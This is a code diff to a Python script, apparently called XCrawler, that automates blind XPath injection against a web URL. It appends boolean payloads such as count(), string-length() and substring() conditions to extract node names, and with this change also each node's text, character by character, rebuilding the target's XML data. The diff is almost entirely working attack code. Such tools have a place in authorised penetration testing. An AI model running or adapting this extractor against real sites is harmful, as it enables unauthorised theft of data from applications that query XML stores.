@@ -1,7 +1,6 @@
 #!/usr/bin/env python
 import argparse
 import string
-import sys
 import urllib
 import urllib2
 from xml.dom.minidom import *
@@ -10,15 +9,14 @@ class XCrawler(object):
     strTrue = " and '1'='1"
     strFalse = " and '1'='0"
     strCount = "' and count({})={}"
-    strLength = "' and string-length(name({}))={}"
-    strSub = "' and substring(name({}),1,{}) = '{}'"
+    strLength = "' and string-length({})={}"
+    strSub = "' and substring({},1,{}) = '{}'"
     strConfirm = "' exists"
     charList = string.printable
 
     def __init__(self):
         args = self.setArgs()
         self.url = args.url
-        self.searchPath = "/*[1]/*"
         self.xml = Document()
 
     def count_node(self, path):
@@ -68,9 +66,17 @@ class XCrawler(object):
         nodeCount = self.count_node(path)
         while nodeIndex <= nodeCount:
             path = base_path + "[{}]".format(nodeIndex)
-            length = self.find_length(path)
-            name = self.find_name(path, length)
+            length = self.find_length("name(" + path + ")")
+            name = self.find_name("name(" + path + ")", length)
+
             node = self.xml.createElement(name)
+
+            text_length = self.find_length(path + "/text()")
+            if text_length > 0:
+                text = self.find_name(path + "/text()", text_length)
+                text_node = self.xml.createTextNode(text)
+                node.appendChild(text_node)
+
             if parent_node is None:
                 self.xml.appendChild(node)
             else:
